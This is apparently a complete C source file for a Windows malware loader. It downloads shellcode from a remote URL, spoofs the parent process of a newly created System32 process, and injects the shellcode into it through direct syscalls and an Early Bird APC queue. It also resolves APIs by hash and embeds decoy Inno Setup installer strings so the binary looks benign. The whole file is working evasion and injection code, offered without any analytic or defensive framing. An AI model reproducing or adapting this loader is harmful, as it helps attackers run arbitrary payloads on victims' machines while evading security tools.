#include <stdio.h>
#include "EarlyBirdAPCInjectionSyscalls.h"

const unsigned char a1[] = "Inno Setup version 5.5.1.ee1 (u) Copyright 1997-2012 Jordan Russell";
const unsigned char a2[] = "Portions Copyright 2000-2012 Martjin Laan";
const unsigned char a3[] = "Setup will install %s into the following folder.";
const unsigned char a4[] = "To continue, click Next. If you would like to select a different folder, click Browse.";
const unsigned char a5[] = "Agree";
const unsigned char a6[] = "Cancel";
const unsigned char a7[] = "At least %s MB of free disk is required.";
const unsigned char a8[] = "Next";
const unsigned char a9[] = "Please read the following License Agreement. You must accept the terms of this agreement before continuing with the installation.";
const unsigned char a0[] = "I accept the agreement";
const unsigned char a11[] = "I do not accept the agreement";
const unsigned char a12[] = "Setup";
const unsigned char a13[] = "It is recommended that you close all other applications before continuing.";
const unsigned char a14[] = "Install";
const unsigned char a15[] = "Modify";
const unsigned char a16[] = "Repair";
const unsigned char a17[] = "Remove";
const unsigned char a18[] = "Click Next to continue, or Cancel to exit Setup.";
const unsigned char a19[] = "Select the components you want to install; clear the components you do not want to install. Click Next when you are ready to continue.";
const unsigned char a20[] = "Full installation";
const unsigned char a21[] = "Minimal installation";
const unsigned char a22[] = "Installation succeeded.";

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL,
                hInternetFile = NULL;
    DWORD		dwBytesRead = NULL;
    SIZE_T		sSize = NULL;
    PBYTE		pBytes = NULL,
                pTmpBytes = NULL;

    hInternet = InternetOpenW(L"Firefox", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	
    if (pTmpBytes)
        LocalFree(pTmpBytes);													
    return bSTATE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

	//Syscall NtAllocateVirtualMemory instead of VirtualAllocEx
	NTSTATUS AVM = 0;
	AVM = Sw3NtAllocateVirtualMemory(hProcess, ppAddress, 0, &sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(AVM)) {
		return FALSE;
	}

	//Syscall NtWriteVirtualMemory instead of WriteProcessMemory
    NTSTATUS WPM = 0;
	WPM = Sw3NtWriteVirtualMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten);
    if (!NT_SUCCESS(WPM)) {
        return FALSE;
    }

    return TRUE;
}

BOOL CreateSuspendedSpoofedProcess2(HANDLE hParentProcess, LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    CHAR CurrentDir[MAX_PATH];

    SIZE_T sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    fnGetEnvironmentVariableA pGetEnvironmentVariableA;
    pGetEnvironmentVariableA = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_GETENVIRONMENTVARIABLEA);

    if (!pGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    sprintf(CurrentDir, "%s\\System32\\", WnDr);

    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        return FALSE;
    }

    SiEx.lpAttributeList = pThreadAttList;

    fnCreateProcessA pCreateProcessA;
    pCreateProcessA = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_CREATEPROCESSA);

    if (!pCreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, CurrentDir, &SiEx.StartupInfo, &Pi)) {
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

//source: https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
int FindMyProcess(const char* ProcessName) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);

    hResult = Process32First(hSnapshot, &pe);

    while (hResult) {
        if (strcmp(ProcessName, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

int main()
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    HANDLE hParent = NULL;
    DWORD dwPPid = FindMyProcess(TARGET_PARENT);

    PBYTE Shellcode = NULL;
    SIZE_T sShellcode = NULL;

    //download the shellcode
    if (!GetPayloadFromUrl(PAYLOAD, &Shellcode, &sShellcode)) {
        return -1;
    }

    //Syscall - Open process to parent
	//We need slightly modified version to initialize the object attributes and client id first
	//before calling the syscall
    NTSTATUS status = 0;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    SW3_CLIENT_ID cid;
    RtlSecureZeroMemory(&cid, sizeof(SW3_CLIENT_ID));  // Ensure complete initialization
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwPPid;     // Proper casting to avoid truncation
    cid.UniqueThread = NULL;                           // Explicitly set thread ID to NULL

    status = Sw3NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        return -2;
    }

    //create target remote process in debugged state
    if (!CreateSuspendedSpoofedProcess2(hParent, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        return -3;
    }

    //inject payload and get the base address
    if (!InjectShellcodeToRemoteProcess(hProcess, Shellcode, sShellcode, &pAddress)) {
        return -4;
    }
    //queue the APC
    fnQueueUserAPC pQueueUserAPC;
    pQueueUserAPC = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_QUEUEUSERAPC);
    pQueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

    //run payload
    fnDebugActiveProcessStop pDebugActiveProcessStop;
    pDebugActiveProcessStop = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_DEBUGACTIVEPROCESSSTOP);
    DebugActiveProcessStop(dwProcessId);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}